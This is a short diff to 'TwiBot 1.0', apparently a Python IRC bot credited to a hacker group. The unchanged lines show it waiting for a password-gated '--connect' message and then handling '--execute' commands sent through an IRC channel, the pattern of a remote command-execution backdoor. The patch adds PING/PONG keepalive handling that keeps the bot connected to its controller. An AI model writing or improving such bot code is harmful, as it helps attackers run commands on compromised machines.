@@ -2,6 +2,8 @@
 # TwiBot 1.0
 # Group: C0d3rs 
 # Author: Twi John
+# Fixed: eric.suporte 
+#
 # WebSite: http://twijohn.blogspot.com/
 #
 # Greetz: Hashin, F0k3rDebug, _mlk_, L4rg4d0, sexpistol, M4CK, c00l3r_, m0nad, akm4nd, b0tluk, sigsegv...
@@ -122,6 +124,11 @@ v = False
 while v != True:
 	msg = s.recv(5000)
 	print msg
+	
+	
+	if msg[0:4] == "PING":
+              s.send(msg.replace("PING", "PONG"))
+	
 	if search("--connect %s" % Password, msg):
 		s.send("PRIVMSG %s : --> Connected! \r\n" % Channel)
 		v = True
@@ -129,6 +136,10 @@ while v != True:
 while(1):
 	msg = s.recv(5000)
 	print msg
+	
+        if msg[0:4] == "PING":
+              s.send(msg.replace("PING", "PONG"))
+	
 	if search("--execute", msg):
 		msg = msg.split("--execute")		
 		msg = msg[1].split("\r\n")
